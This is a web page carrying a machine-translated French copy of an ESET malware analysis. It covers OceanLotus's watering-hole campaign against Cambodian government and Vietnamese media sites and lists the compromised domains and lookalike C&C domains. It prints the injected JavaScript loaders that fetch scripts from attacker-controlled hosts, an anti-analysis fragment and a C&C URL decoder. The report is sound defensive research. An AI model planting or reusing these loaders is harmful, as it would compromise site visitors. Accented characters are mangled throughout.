<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üòº üöê üë∂üèæ OceanLotus: attaque d'un point d'eau en Asie du Sud-Est üåΩ ‚óºÔ∏è üñï</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Les sp√©cialistes d'ESET ont analys√© la nouvelle campagne des points d'eau, qui cible plusieurs sites en Asie du Sud-Est. Il semblerait que les assaill...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>OceanLotus: attaque d'un point d'eau en Asie du Sud-Est</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/436136/">  Les sp√©cialistes d'ESET ont analys√© la nouvelle campagne des points d'eau, qui cible plusieurs sites en Asie du Sud-Est.  Il semblerait que les assaillants op√®rent depuis d√©but septembre 2018.  La campagne est d'une ampleur diff√©rente - nous avons r√©ussi √† d√©couvrir 21 ressources compromises, dont les sites Web du minist√®re de la D√©fense du Cambodge, du minist√®re des Affaires √©trang√®res et de la Coop√©ration internationale du Cambodge, ainsi que plusieurs journaux et blogs vietnamiens. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/i5/w7/do/i5w7dovvrgp-jyuwqn0cgd72oy0.jpeg"></div> <br>  Sur la base de l'analyse, nous avons constat√© que la campagne est men√©e par le groupe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">OceanLotus</a> , √©galement connu sous le nom <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ART32</a> et ART-S-00.  Le groupe op√®re depuis au moins <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">2012</a> et est sp√©cialis√© dans le cyberespionnage, avec un int√©r√™t particulier pour les agences gouvernementales et les dissidents. <br><br><a name="habracut"></a>  Il semble que la campagne soit une √©volution du sch√©ma des points d'eau OceanLotus, que les chercheurs de Volexity ont <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">document√©</a> en 2017 sous le nom de Framework B.Depuis l'ann√©e derni√®re, le cybergroupe a appris √† rendre difficile l'analyse de ses frameworks malveillants.  Entre autres am√©liorations, nous avons not√© l'utilisation du chiffrement √† cl√© publique pour l'√©change de la cl√© de session AES.  La m√©thode est utilis√©e pour crypter l'√©change de donn√©es qui ne permet pas aux produits de s√©curit√© d'intercepter la charge utile finale.  De plus, les attaquants sont pass√©s de HTTP √† WebSocket pour masquer les √©changes de donn√©es malveillants. <br><br>  Chacun des sites compromis d√©couvert par les experts ESET a redirig√© les visiteurs vers un domaine distinct contr√¥l√© par OceanLotus. <br><br>  L'image ci-dessous montre les r√©gions cibles de la campagne. <br><br><img src="https://habrastorage.org/webt/ek/wr/ov/ekwrovbvngwngd-noo6vevjqfqo.png"><br>  <i>Figure 1. G√©ographie des sites compromis</i> <br><br>  Les domaines les plus compromis sont les m√©dias d'information ou li√©s au gouvernement du Cambodge.  Voici une liste des victimes.  Nous les avons avertis de tout compromis en octobre, mais fin 2018, des scripts malveillants sont rest√©s sur certains sites: <br><br>  - baotgm [.] Net - M√©dias vietnamiens (si√®ge √† Arlington, Texas) <br>  - cnrp7 [.] Org - Site Internet du Parti du salut national du Cambodge <br>  - conggiaovietnam [.] Net - contenu religieux en vietnamien <br>  - daichungvienvinhthanh [.] Com - contenu religieux en vietnamien <br>  - danchimviet [.] Info - M√©dias vietnamiens <br>  - danviet [.] Vn - M√©dias vietnamiens <br>  - danviethouston [.] Com - M√©dias vietnamiens <br>  - fvpoc [.] Org - Organisation publique vietnamienne <br>  - gardencityclub [.] Com - site du club de golf √† Phnom Penh, Cambodge <br>  - lienketqnhn [.] Org - M√©dias vietnamiens <br>  - mfaic.gov [.] Kh - Minist√®re des affaires √©trang√®res et de la coop√©ration internationale du Cambodge <br>  - mod.gov [.] Kh - Minist√®re de la d√©fense du Cambodge <br>  - mtgvinh [.] Net - contenu religieux en vietnamien <br>  - nguoitieudung.com [.] Vn - M√©dias vietnamiens <br>  - phnompenhpost [.] Com - M√©dias cambodgiens en anglais <br>  - raovatcalitoday [.] Com - site en vietnamien <br>  - thongtinchongphandong [.] Com - m√©dias d'opposition en vietnamien <br>  - tinkhongle [.] Com - M√©dias vietnamiens <br>  - toithichdoc.blogspot [.] Com - Blog vietnamien <br>  - trieudaiviet [.] Com - site en vietnamien <br>  - triviet [.] News - M√©dias vietnamiens <br><br>  Dans les attaques de points d'eau, les attaquants compromettent g√©n√©ralement les sites qui sont fr√©quemment visit√©s par les victimes potentielles.  Cependant, dans cette campagne, le groupe OceanLotus a compromis plusieurs sites populaires.  Vous trouverez ci-dessous une liste des sites compromis et leur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">classement Alexa</a> : mondial et dans le pays o√π le site est le plus populaire.  Par exemple, le site Internet du journal Dan Viet (danviet [.] Vn) fin 2018 se situait au 116√®me rang en termes de fr√©quentation au Vietnam. <br><br>  - danviet [.] Vn - 12 887/116 <br>  - phnompenhpost [.] Com - 85 910/18 880 <br>  - nguoitieudung.com [.] Vn - 261 801/2 397 <br>  - danchimviet [.] Info - 287 852/144 884 <br>  - baotgm [.] Net - 675 669/119 737 <br>  - toithichdoc.blogspot [.] Com - 700 470/11532 <br>  - mfaic.gov [.] Kh - 978 165/2 149 <br>  - conggiaovietnam [.] Net - 1 040 548/15 368 <br>  - thongtinchongphandong [.] Com - 1 134 691/21 575 <br>  - tinkhongle [.] Com - 1 301 722/15 224 <br>  - daichungvienvinhthanh [.] Com - 1 778 418/23 428 <br>  - mod.gov [.] Kh - 4 247 649/3 719 <br><br><h3>  Analyse </h3><br>  Pour tous les sites compromis, des m√©thodes similaires ont √©t√© utilis√©es.  Les attaquants ont ajout√© un petit morceau de code JavaScript √† la page principale ou √† un fichier JavaScript publi√© sur le m√™me serveur.  Un fragment de code l√©g√®rement obscurci (voir ci-dessous) charge un autre script √† partir d'un serveur contr√¥l√© par l'attaquant.  Ci-dessous, un extrait JavaScript ajout√© √† <code>https://www.mfaic.gov[.]kh/wp-content/themes/ministry-of-foreign-affair/slick/slick.min.js</code> , qui t√©l√©charge le fichier √† partir de <code>https://weblink.selfip[.]info/images/cdn.js?from=maxcdn</code> . <br><br><pre> <code class="javascript hljs">(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> pt = <span class="hljs-string"><span class="hljs-string">"http"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); l.src = pt + <span class="hljs-string"><span class="hljs-string">"s://"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">2</span></span>] + <span class="hljs-built_in"><span class="hljs-built_in">arguments</span></span>[<span class="hljs-number"><span class="hljs-number">3</span></span>] + <span class="hljs-string"><span class="hljs-string">'ip.'</span></span> + <span class="hljs-string"><span class="hljs-string">'info/images/cdn.js?from=maxcdn'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'body'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].appendChild(l) })(<span class="hljs-string"><span class="hljs-string">'web'</span></span>, <span class="hljs-string"><span class="hljs-string">'a'</span></span>, <span class="hljs-string"><span class="hljs-string">'link'</span></span>, <span class="hljs-string"><span class="hljs-string">'.self'</span></span>);</code> </pre> <br>  Pour √©viter d'√™tre d√©tect√©, les attaquants ont pris les mesures suivantes: <br><br>  - Ils masquent les scripts pour emp√™cher l'allocation d'URL finales statiques <br>  - L'URL ressemble √† la vraie biblioth√®que JavaScript utilis√©e par le site <br>  - Pour chaque site compromis, un domaine et un URI distincts sont utilis√©s. <br>  - Tous les sites compromis ont des scripts diff√©rents.  Voici un script impl√©ment√© dans l'un des sites compromis: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> script = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">"script"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-string"><span class="hljs-string">'crash-course'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = <span class="hljs-string"><span class="hljs-string">"fzgbc knowsztall znfo"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _ = <span class="hljs-string"><span class="hljs-string">'/'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> e = <span class="hljs-string"><span class="hljs-string">"VisitorIdentification.js?sa="</span></span> + i; script.async = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; script.src = <span class="hljs-string"><span class="hljs-string">"htt"</span></span> + <span class="hljs-string"><span class="hljs-string">"ps:"</span></span> + _ + _ + s.split(<span class="hljs-string"><span class="hljs-string">" "</span></span>).map(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">x</span></span></span><span class="hljs-function"> =&gt;</span></span> x.replace(<span class="hljs-string"><span class="hljs-string">"z"</span></span>, <span class="hljs-string"><span class="hljs-string">"i"</span></span>)).join(<span class="hljs-string"><span class="hljs-string">"."</span></span>) + _ + e; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> doc = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementsByTagName(<span class="hljs-string"><span class="hljs-string">'script'</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]; doc.parentNode.insertBefore(script, doc);</code> </pre> <br><h3>  Premi√®re √©tape </h3><br>  Selon l'emplacement de l'adresse IP du visiteur, le serveur de la premi√®re √©tape (par exemple, <code>weblink.selfip[.]info</code> pour <code>mfaic.gov[.]kh</code> ) transmet un faux script (biblioth√®que JavaScript l√©gitime al√©atoire), ou un script de la premi√®re √©tape (par exemple, SHA- 1: 2194271C7991D60AE82436129D7F25C0A689050A).  Tous les serveurs n'effectuent pas de v√©rification d'emplacement, mais s'il y en a un, seuls les visiteurs du Vietnam et du Cambodge re√ßoivent un script malveillant. <br><br>  Le script de la premi√®re √©tape comporte plusieurs v√©rifications pour emp√™cher la d√©tection, comme indiqu√© ci-dessous. <br><br><pre> <code class="javascript hljs">[‚Ä¶] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">t</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> r = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; !<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">t, n</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(t <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> n)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">TypeError</span></span>(<span class="hljs-string"><span class="hljs-string">'Cannot call a class as a function'</span></span>); }(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, t), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.t = { <span class="hljs-attr"><span class="hljs-attr">o</span></span>: <span class="hljs-literal"><span class="hljs-literal">null</span></span>, <span class="hljs-attr"><span class="hljs-attr">s</span></span>: !<span class="hljs-number"><span class="hljs-number">0</span></span> }, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.scr = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.r(), <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.i = !<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.addEventListener(<span class="hljs-string"><span class="hljs-string">'scroll'</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ ri || r.scr &amp;&amp; !rts &amp;&amp; (r.scr = !<span class="hljs-number"><span class="hljs-number">1</span></span>, rc(n)), ri = !<span class="hljs-number"><span class="hljs-number">1</span></span>; }); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> t.prototype.r = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>; setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> n = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerWidth - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerWidth &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, r = <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.outerHeight - <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.innerHeight &gt; <span class="hljs-number"><span class="hljs-number">160</span></span>, e = n ? <span class="hljs-string"><span class="hljs-string">'vertical'</span></span> : <span class="hljs-string"><span class="hljs-string">'horizontal'</span></span>; r &amp;&amp; n || !(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.Firebug.chrome.isInitialized || n || r) ? (tts = !<span class="hljs-number"><span class="hljs-number">1</span></span>, tto = <span class="hljs-literal"><span class="hljs-literal">null</span></span>) : (tts = !<span class="hljs-number"><span class="hljs-number">0</span></span>, tto = e); }, <span class="hljs-number"><span class="hljs-number">500</span></span>); } [‚Ä¶]</code> </pre> <br>  Le script attend que la victime d√©file jusqu'√† la page.  Il v√©rifie √©galement la r√©solution de la fen√™tre et si Firebug, un plug-in bas√© sur un navigateur pour analyser les pages Web, est activ√©.  Si au moins l'un des contr√¥les √©choue, l'ex√©cution est interrompue. <br><br>  Il d√©crypte ensuite le domaine du serveur de commandes C&amp;C √† l'aide d'un algorithme personnalis√©.  Par exemple, 3B37371M1B1B382R332V1A382W36392W2T362T1A322T38 signifie <code>wss://tcog.thruhere[.]net</code> .  Pour chaque domaine de la premi√®re √©tape, les attaquants ont en outre enregistr√© un domaine de la deuxi√®me √©tape, et tous se trouvent sur des serveurs diff√©rents.  Le code ci-dessous est l'√©quivalent de la fonction de d√©chiffrement √©crite en Python. <br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(encrypted_url)</span></span></span><span class="hljs-function">:</span></span> s = <span class="hljs-string"><span class="hljs-string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">""</span></span>.join(chr(s.index(encrypted_url[e]) * <span class="hljs-number"><span class="hljs-number">36</span></span> + s.index(encrypted_url[e+<span class="hljs-number"><span class="hljs-number">1</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>,len(encrypted_url),<span class="hljs-number"><span class="hljs-number">2</span></span>))</code> </pre> <br>  Apr√®s avoir d√©chiffr√© l'adresse C&amp;C, le script envoie une cha√Æne unique de 15 chiffres, puis re√ßoit et ex√©cute le script de deuxi√®me √©tape.  L'√©change de donn√©es s'effectue via WebSocket ou SSL.  Le protocole fournit une communication bidirectionnelle simultan√©e entre le client et le serveur.  Cela signifie qu'apr√®s qu'un client a √©tabli une connexion, le serveur peut envoyer des donn√©es au client m√™me sans demande.  Cependant, dans un cas particulier, le protocole est utilis√© principalement pour √©viter la d√©tection. <br><br><h3>  Deuxi√®me √©tape </h3><br>  Le script de la deuxi√®me √©tape est destin√© √† la reconnaissance.  Les d√©veloppeurs d'OceanLotus ont utilis√© la biblioth√®que fingerprintjs2 de Valve, disponible sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">GitHub</a> , avec des modifications mineures - ajoutant le partage r√©seau et cr√©ant un rapport sp√©cial. <br><br>  La figure ci-dessous montre les diff√©rentes actions effectu√©es par le script.  La communication se fait via une session WebSocket qui a commenc√© avec la premi√®re √©tape. <br><br><img src="https://habrastorage.org/webt/p7/s1/ip/p7s1ipl0ax28vo16mj2je2a59kc.png"><br>  <i>Figure 2. Sch√©ma de la deuxi√®me √©tape de la charge utile</i> <br><br>  La communication est crypt√©e √† l'aide de la cl√© de session AES g√©n√©r√©e par le serveur.  Il est chiffr√© avec une cl√© publique RSA 1024 bits et envoy√© au client, il n'est donc pas possible de d√©chiffrer l'√©change de donn√©es entre le client et le serveur. <br><br>  Par rapport aux versions pr√©c√©dentes de la structure des points d'eau du groupe OceanLotus, il est plus difficile de vous prot√©ger contre cela car la transmission de donn√©es sur le r√©seau ne peut pas √™tre d√©tect√©e et d√©crypt√©e.  Cela emp√™che la d√©couverte de donn√©es sur le r√©seau.  La cl√© publique transmise par le serveur ne change pas et est r√©pertori√©e dans la section IoC. <br><br>  Le script de reconnaissance cr√©e un rapport similaire √† celui ci-dessous et l'envoie au serveur C&amp;C de la deuxi√®me √©tape. <br><br><pre> <code class="javascript hljs">{ <span class="hljs-string"><span class="hljs-string">"history"</span></span>: { <span class="hljs-string"><span class="hljs-string">"client_title"</span></span>: <span class="hljs-string"><span class="hljs-string">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_cookie"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_hash"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, <span class="hljs-string"><span class="hljs-string">"client_referrer"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://www.mfaic.gov.kh/foreign-ngos"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_platform_ua"</span></span>: <span class="hljs-string"><span class="hljs-string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_time"</span></span>: <span class="hljs-string"><span class="hljs-string">"2018-10-21T12:43:25.254Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"timezone"</span></span>: <span class="hljs-string"><span class="hljs-string">"Asia/Bangkok"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_network_ip_list"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"192.168.xx"</span></span>, <span class="hljs-string"><span class="hljs-string">"xxxx"</span></span> ], <span class="hljs-string"><span class="hljs-string">"client_api"</span></span>: <span class="hljs-string"><span class="hljs-string">"wss://tcog.thruhere.net/"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_zuuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span></span>, <span class="hljs-string"><span class="hljs-string">"client_uuid"</span></span>: <span class="hljs-string"><span class="hljs-string">"a612cdb028e1571dcab18e4aa316da26"</span></span> }, <span class="hljs-string"><span class="hljs-string">"navigator"</span></span>: { <span class="hljs-string"><span class="hljs-string">"plugins"</span></span>: { <span class="hljs-string"><span class="hljs-string">"activex"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"cors"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"flash"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"java"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"foxit"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"phonegap"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"quicktime"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"realplayer"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"silverlight"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"touch"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vbscript"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"vlc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span>, <span class="hljs-string"><span class="hljs-string">"webrtc"</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>, <span class="hljs-string"><span class="hljs-string">"wmp"</span></span>: <span class="hljs-literal"><span class="hljs-literal">false</span></span> }, <span class="hljs-string"><span class="hljs-string">"_screen"</span></span>: { <span class="hljs-string"><span class="hljs-string">"width"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"height"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"availWidth"</span></span>: <span class="hljs-number"><span class="hljs-number">1920</span></span>, <span class="hljs-string"><span class="hljs-string">"availHeight"</span></span>: <span class="hljs-number"><span class="hljs-number">1080</span></span>, <span class="hljs-string"><span class="hljs-string">"resolution"</span></span>: <span class="hljs-string"><span class="hljs-string">"1920x1080"</span></span> }, <span class="hljs-string"><span class="hljs-string">"_plugins"</span></span>: [ [...]</code> </pre> <br>  Ce rapport est presque identique √† l'autre g√©n√©r√© par le <a href="">Framework OceanLotus B</a> , document√© par Volexity en 2017.  Leurs sections sont similaires et contiennent des fautes de frappe identiques.  En raison de cette similitude et de la localisation des objectifs, nous pouvons dire avec une grande certitude que c'est OceanLotus qui m√®ne la campagne. <br><br>  Le rapport g√©n√©r√© contient des informations d√©taill√©es sur le navigateur de la victime et le site visit√©: agent utilisateur, en-t√™te de demande HTTP Referer, adresse IP locale et externe, plug-ins et param√®tres de langue du navigateur d√©finis. <br><br>  De plus, chaque machine poss√®de deux identifiants uniques: <i>client_zuuid</i> et <i>client_uuid</i> .  Ils peuvent √™tre utilis√©s pour identifier les utilisateurs et suivre leurs visites.  Ces identifiants √©taient effectivement pr√©sents dans la version 2017 du framework, et <i>client_uuid a √©t√©</i> calcul√© de mani√®re similaire. <br><br>  La valeur de <i>client_zuuid</i> est la concat√©nation des diff√©rentes valeurs deviceId contenues dans navigator.mediaDevices.enumerateDevices.  Les appareils sont des appareils externes auxquels le navigateur a acc√®s, tels que des cam√©ras et des microphones.  Ainsi, la valeur pour un utilisateur doit correspondre lors de diff√©rentes visites √† partir du m√™me ordinateur. <br><br>  La valeur <i>client_uuid</i> est le hachage MD5 des empreintes digitales allou√©es par fingerprintjs2.  Les donn√©es collect√©es incluent l'agent utilisateur du navigateur, la langue, le fuseau horaire, les plug-ins du navigateur et les polices accessibles par le navigateur.  Et encore une fois - la valeur doit √™tre identique pour toutes les visites, uniquement si, par exemple, l'utilisateur ne met pas √† jour le navigateur ou ne se connecte pas √† partir d'un autre appareil. <br><br>  Enfin, le serveur peut envoyer du code JavaScript suppl√©mentaire √† l'ordinateur de la victime, c'est peut-√™tre le composant livr√©.  Malheureusement, en raison de l'utilisation de la cl√© de session AES pour d√©crypter l'√©change de donn√©es, nous n'avons pas pu d√©terminer quel composant est fourni par les intrus dans des √©chantillons sauvages.  De plus, la charge utile n'est livr√©e qu'√† certaines victimes.  Ainsi, en utilisant une machine de test, nous n'avons pas pu les obtenir.  Cependant, selon des rapports pr√©c√©dents, les campagnes des points d'eau d'OceanLotus visent le phishing.  Par exemple, Volexity dans un rapport a <a href="">√©crit</a> que les utilisateurs ont vu une fen√™tre pop-up leur demandant d'autoriser l'acc√®s via le protocole ouvert OAuth au compte Google de la victime pour l'application Google OceanLotus.  Gr√¢ce √† cette technique, les attaquants peuvent acc√©der aux contacts et aux e-mails de la victime. <br><br><h3>  Infrastructure r√©seau </h3><br>  Pour un travail secret maximum, les op√©rateurs OceanLotus ont enregistr√© un domaine pour les premi√®re et deuxi√®me √©tapes pour chacun des sites compromis.  Chaque domaine est h√©berg√© sur un serveur distinct avec sa propre adresse IP.  Au moins 50 domaines et 50 serveurs sont enregistr√©s pour cette campagne. <br><br>  La plupart des domaines de premi√®re √©tape sont enregistr√©s sur des services avec des noms de domaine gratuits, les domaines de deuxi√®me √©tape sont principalement pay√©s.  Entre autres, leurs noms sont d√©guis√©s en l√©gitimes.  Voici une liste des services que les attaquants ont tent√© de copier - C&amp;C et un domaine l√©gitime, respectivement: <br><br>  - cdn-ampproject [.] Com / cdn.ampproject.com <br>  - bootstraplink [.] Com / getbootstrap.com <br>  - sskimresources [.] Com / s.skimresources.com <br>  - widgets-wp [.] Com / widgets.wp.com <br><br>  Le nombre de domaines utilis√©s et leur similitude avec des sites l√©gitimes peuvent compliquer la d√©tection par une personne qui consulte le trafic r√©seau. <br><br><h3>  Conclusion </h3><br>  Malgr√© l'attention des chercheurs en s√©curit√©, OceanLotus continue d'attaquer avec succ√®s des cibles en Asie du Sud-Est.  De plus, le groupe am√©liore les outils en incluant dans son arsenal un framework pour les attaques de points d'eau, un malware pour Windows et macOS.  Les r√©centes mises √† jour du framework discut√©es dans ce rapport indiquent que les attaquants ont am√©lior√© leurs comp√©tences. <br><br>  Pour limiter le nombre de victimes possibles, nous avons inform√© les propri√©taires des sites compromis et expliqu√© comment supprimer le code JavaScript malveillant.  Cependant, certains d'entre eux n'ont pas montr√© de volont√© d'accepter des informations et de l'aide. <br><br>  Les chercheurs d'ESET continueront de surveiller le d√©veloppement du groupe OceanLotus.  Des indicateurs de compromis peuvent √™tre trouv√©s sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">GitHub</a> . 